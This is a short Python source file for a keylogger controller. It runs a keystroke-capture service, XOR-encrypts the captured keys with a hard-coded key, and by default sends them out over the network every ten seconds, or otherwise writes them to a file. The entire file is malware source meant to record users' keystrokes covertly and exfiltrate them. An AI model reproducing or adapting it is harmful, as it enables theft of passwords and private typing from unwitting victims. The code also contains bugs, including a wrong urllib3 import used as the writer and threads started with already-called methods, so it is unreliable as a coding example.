from urllib3.filepost import writer

from  KeyloggerService import *
from FileWriter import *
import threading
import time
from  IEncryptor import *
from network_writer import *

from modules.Encryptor import XOREncryptor




class KeyLoggerManager:

    def __init__(self, mode = "network"):
        self.instance = KeyloggerService()
        self.encryptor :  IEncryptor = XOREncryptor()
        self.mode = mode

        if  self.mode == "network":
            self.writer = NetworkWriter()
        else:
            self.writer  = FileWriter()

    def start(self):
        self.instance.start()
        while self.instance.return_action():
            True
        return

    def write_to_file(self):
        while self.instance.return_action():

            self.writer.write(self.xor_encryption())
            time.sleep(3)

    def write_to_network(self):
        while self.instance.return_action():
            stop_key_looger = writer.write(self.xor_encryption())
            if not (stop_key_looger):
                self.instance.start()
            time.sleep(10)


    def xor_encryption(self):
        return self.encryptor.encryption(self.instance.get_data(),"abc")


    def main(self):
        threading.Thread(target=self.start).start()
        time.sleep(0.1)

        if self.mode  == "network":
            threading.Thread(target=self.write_to_network()).start()
            time.sleep(0.1)
        else:
            threading.Thread(target=self.write_to_file()).start()
            time.sleep(0.1)




A = KeyLoggerManager()
A.main()
